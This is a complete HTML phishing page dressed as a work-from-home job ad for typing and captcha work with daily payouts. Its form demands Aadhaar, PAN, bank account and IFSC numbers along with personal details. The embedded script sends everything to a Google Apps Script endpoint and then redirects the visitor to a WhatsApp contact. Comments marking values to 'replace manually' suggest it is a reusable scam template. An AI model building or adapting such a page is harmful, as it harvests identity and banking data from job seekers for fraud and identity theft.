<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Typing,Captcha,Form-Fill Work</title>
  <style>
    body {
      font-family: "Poppins", sans-serif;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      color: #fff;
      margin: 0;
      padding: 0;
      min-height: 100vh;
    }

    .container {
      max-width: 500px;
      background: #ffffff;
      color: #333;
      padding: 25px;
      border-radius: 25px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
      margin: 30px auto;
    }

    h3 {
      text-align: center;
      color: #0072ff;
      margin-bottom: 10px;
    }

    .subtext {
      text-align: center;
      color: #556;
      font-size: 16px;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 12px;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 16px;
      transition: all 0.2s ease;
    }

    input:focus, select:focus {
      border-color: #0072ff;
      box-shadow: 0 0 5px #0072ff;
      outline: none;
    }

    input[type="checkbox"] {
      width: auto;
      margin-right: 10px;
      accent-color: #0072ff;
    }

    button {
      width: 100%;
      background: linear-gradient(90deg, #00c6ff, #0072ff);
      color: white;
      padding: 12px;
      border: none;
      font-size: 18px;
      border-radius: 10px;
      margin-top: 15px;
      cursor: pointer;
      transition: transform 0.3s ease;
    }

    button:hover {
      transform: scale(1.03);
    }

    button:disabled {
      background: gray;
      cursor: not-allowed;
      transform: none;
    }

    footer {
      text-align: center;
      color: #fff;
      margin: 20px;
      font-size: 15px;
      font-weight: 500;
    }

    footer span {
      color: #ffe600;
    }
  </style>
</head>
<body>
  <div class="container">
    <h3>➜Typing,Captcha,Form-Fill Work🏠</h3>
    <div class="subtext">Apply Below & Start Working From Home</div>
        <ul class="work-details">
      <li>➜Work From 🏠Home</li>
      <li>➜Work: <b>Typing, Captcha, Form-Fill</b></li>
      <li>➜Company Name: <b>Ang Mirae Up</b></li>
      <li>➜Daily Payout Available</li>
      <li><b>➜Free Registration</b></li>
      <li>➜Full Time/Part Time (1-4 hrs)</li>
      <li>➜Phone Is Enough</li>
      <li>➜₹1000–₹2000/Day{200captcha=1k}</li>
    </ul>

    <header>
      <h6><b>AFTER PROCESS WE GUIDE YOU! WANT TO JOIN THEN SEND</b></h6>
    </header>  

    <h4><b>ANSWER THESE QUESTIONS👇 {required}</b></h4>

    <form id="workForm">
      <label>Full Name</label>
      <input type="text" name="name" required />

      <label>Aadhaar Link Mobile Number</label>
      <input type="tel" name="mobile" maxlength="10" required />

      <label>Email</label>
      <input type="email" name="email" placeholder="example@gmail.com" required />

      <label>PAN Card Number</label>
      <input type="text" name="pan" placeholder="ABCDE1234F" maxlength="10" required />

      <label>Aadhaar Card Number</label>
      <input type="text" name="aadhaar" maxlength="12" required />

      <label>Account Number</label>
      <input type="text" name="account" required />

      <label>IFSC Code</label>
      <input type="text" name="ifsc" placeholder="SBIN000123" maxlength="11" required />

      <label>Gender</label>
      <select name="gender" required>
        <option value="">Select Gender</option>
        <option>Male</option>
        <option>Female</option>
      </select>

      <label>Date of Birth</label>
      <input type="text" name="dob" placeholder="DD-MM-YYYY" required />

      <label>State</label>
      <select name="state" required>
        <option value="">Select State</option>
        <option>Bihar</option>
        <option>Uttar Pradesh</option>
        <option>Maharashtra</option>
        <option>Delhi</option>
        <option>Rajasthan</option>
        <option>Madhya Pradesh</option>
        <option>West Bengal</option>
        <option>Punjab</option>
        <option>Haryana</option>
        <option>Gujarat</option>
        <option>Karnataka</option>
        <option>Tamil Nadu</option>
        <option>Odisha</option>
        <option>Assam</option>
        <option>Kerala</option>
        <option>Jharkhand</option>
        <option>Chhattisgarh</option>
        <option>Telangana</option>
        <option>Others</option>
      </select>

      <label>
        <input type="checkbox" id="agreeBox" />
        Yes I have Aadhaar Link Mobile
      </label>

      <button type="submit" id="submitBtn" disabled>Submit & Continue on WhatsApp</button>
    </form>
  </div>

  <footer>
    <span>STEP ➜</span> FILL FORM ➜ MSG ON WHATSAPP ➜ HR DO PROCESS ➜ YOU GET ID ➜ WORK STARTED ➜ FREE OF COST
  </footer>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbyfabQmpdkqhjUJ3r2MqfPn2y8HXvxpEcG_2hVbEv1Jj2Smz7StqgiiYccyaS-OPg39/exec"; // replace manually
    const whatsappURL = "https://wa.me/917093717252?text=Hi%20I%20Submit%20Form%20Join Me"; // replace manually (e.g. https://wa.me/91XXXXXXXXXX?text=Hi%20I%20am%20interested)

    const form = document.getElementById("workForm");
    const checkbox = document.getElementById("agreeBox");
    const submitBtn = document.getElementById("submitBtn");

    checkbox.addEventListener("change", () => {
      submitBtn.disabled = !checkbox.checked;
    });

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const formData = new FormData(form);
      fetch(scriptURL, { method: "POST", body: formData })
        .then(() => {
          window.location.href = whatsappURL;
        })
        .catch(err => alert("Error! " + err.message));
    });
  </script>
</body>
</html>
